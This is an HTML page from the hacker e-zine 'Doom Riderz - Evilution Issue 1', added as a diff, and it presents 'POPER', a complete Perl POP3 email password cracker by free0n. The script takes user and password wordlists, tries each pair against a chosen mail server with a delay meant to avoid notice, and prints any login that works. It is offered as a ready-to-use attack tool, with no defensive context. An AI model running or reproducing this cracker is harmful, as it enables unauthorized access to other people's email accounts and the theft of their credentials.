@@ -1,0 +1,177 @@
+<html>
+<head>
+<title>Doom Riderz - Evilution Issue 1</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="../doom.css">
+<script type="text/javascript" src="../fader.js"></script>
+</head>
+<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<br>
+<div id="viewerText">
+<div id="viewerTextHeader"><a href="#">PERL.Poper by free0n</a></div>
+<pre>
+<!--- put article/source here --->
+#!/usr/bin/perl
+################################################################################
+# POPER - Pop3 Email Cracker
+# by-free0n
+# DoomRiderz - doomriderz.co.nr
+# usage: perl poper.pl
+################################################################################
+# This is a pop3 brute force dictionary attacker that can
+# read a list of users or specified user and run a password
+# list attack against them. The brute forcer has a delay option
+# which makes it not clog up the server with to many connections
+# the option is defaulted to 10 seconds but can be changed for longer
+# iterations.
+################################################################################
+use Net::POP3;
+
+#default variable options
+my $host = "localhost";
+my $delay = "10";
+my $account = "";
+my $status = "1";
+
+#arrays we use to store the usernames and passwords
+#from the files
+@users = ();
+@passes = ();
+
+#this is the name of the user and pass list
+#by default it looks in the current directory as
+#the script. So you will need to have a user list
+#called users and a password list call pass
+$user_list = 'users';
+$pass_list = 'pass';
+
+#variable is used to call clear which clears our screen
+my $clear = '/usr/bin/clear';
+
+#clear the terminal screen and write out the pretty banner :)
+sub CLANSCR {
+    open (CLEAR, "|$clear");
+    close (CLEAR);
+    
+    print "-----------------------------------------------------------------\n";
+    print "POPER POP3 Email Attacker\n";
+    print "by-free0n\n";
+    print "DoomRiderz - doomriderz.co.nr\n";
+    print "Usage: perl poper.pl\n";
+    print "------------------------------------------------------------------\n";
+};
+
+#input gathers all the user input we need to launch the
+#attack
+sub INPUT {
+    print "Please enter the host:";
+    $host = &lt;STDIN&gt;;
+    chomp $host;
+    
+    print "Login Delay (10 seconds default):";
+    $delay = &lt;STDIN&gt;;
+    chomp $delay;
+    
+    print "Do you know a user account? [y/n]:";
+    $account = &lt;STDIN&gt;;
+    chomp $account;
+    
+    if($account eq "y") {
+        print "Please enter the user account:";
+        $account = &lt;STDIN&gt;;
+        chomp $account;
+        } else {
+        $account = "";
+    }
+    
+    print "Would you like to display accounts being tried? [y/n]:";
+    $status = &lt;STDIN&gt;;
+    chomp $status;
+    
+    if($host eq "") {
+        die("No host specified aborting!");
+    }
+    if($delay eq "") {
+        $delay = 10;
+    }
+    
+    print "Starting the Attack! please wait for status update...\n";
+};
+
+#call our subs this is more of the main
+#start of the application..
+&CLANSCR;
+&INPUT;
+
+#try and open the pass file
+open (PASS, "$pass_list") or
+die "Can't find the pass file abort!\n\n";
+
+#we decide if we are going to load the userlist or
+#an account specified in the options
+if($account eq "") {
+    open (USER, "$user_list") or
+    die "Can't find the user file abort!\n\n";
+    
+    while($uline = &lt;USER&gt;) {
+        ($user) = split(" ",$uline);
+        push @users, "$user";
+    }
+    close(USER);
+    
+    } else {
+    push @users, "$account";
+}
+
+#store passwords in list
+while ($pline = &lt;PASS&gt;) {
+    ($pass) = split(" ",$pline);
+    push @passes, "$pass";
+}
+close(PASS);
+
+
+foreach $user (@users) {
+    
+    foreach $pass (@passes) {
+        
+        #this little countdown script is what causes the delay
+        #the delay is useful so we don't overload the server at once
+        #but can kind of test the account one per minute or one per hour
+        #kind of making us less seem like a hacker i guess....
+        if($delay &gt; 0) {
+            $countdown = $delay;
+            while($countdown &gt; 0) {
+                sleep 1;
+                --$countdown;
+            }
+        }
+        
+        #connect to the host
+        $pop = Net::POP3-&gt;new($host, Timeout =&gt; 60)
+        or die("couldn't connect to host:" . $host);
+        
+        #display status of accounts that are being tested
+        if($status eq "1" or $status eq "y") {
+            print "Trying " .$user . " password " . $pass . "\n";
+        }
+        
+        if($pop-&gt;login($user, $pass)) {
+            #let the user know we found an account, \a sets of the terminal bell
+            print "\a";
+            print "--------------------------------------------------------------\n";
+            print "Login found\n";
+            print "--------------------------------------------------------------\n";
+            print "username:" . $user . "\n";
+            print "password:" . $pass . "\n";
+            print "--------------------------------------------------------------\n";
+            exit;
+        }
+        
+        $pop-&gt;quit();
+    }
+}
+</pre>
+</div>
+</body>
+</html>
